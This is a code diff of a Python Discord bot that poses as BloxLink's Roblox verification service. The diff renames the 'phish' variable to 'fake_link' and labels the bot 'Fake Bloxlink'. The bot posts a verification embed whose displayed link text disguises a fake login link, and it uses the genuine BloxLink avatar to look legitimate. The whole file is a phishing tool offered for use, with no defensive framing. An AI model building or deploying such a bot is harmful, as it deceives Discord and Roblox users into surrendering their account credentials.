@@ -3,16 +3,14 @@ from discord.ext import commands
 
 intents = discord.Intents.all()
 
-# Settings (Change these to your liking)
+# Settings (Change these to whatever you want)
 token = "YOUR_BOT_TOKEN"
 prefix = "!"
 title = "Please Complete Verification"
 desc = "To verify your account, please join BloxLink's Official Roblox Verification Game"
 field = "Please Login and join the game!"
 hyperlink = "SEEMINGLY_REAL_LINK"
-phish = "YOUR_FAKE_LINK"
-
-###################################################################
+fake_link = "YOUR_FAKE_LINK"
 
 client = commands.Bot(command_prefix=prefix, intents=intents)
 client.remove_command('help')
@@ -21,11 +19,11 @@ client.remove_command('help')
 async def on_ready():
     print('')
     print('----------------')
-    print('Bot Online!')
+    print('Fake Bloxlink is Online!')
     print('----------------')
 
 main = discord.Embed(title=title, description=desc, color=0xcf4948)
-main.add_field(name=field, value=f"[{hyperlink}]({phish})")
+main.add_field(name=field, value=f"[{hyperlink}]({fake_link})")
 main.set_thumbnail(url='https://avatars.githubusercontent.com/u/39774496?s=200&v=4')
 
 @client.command()
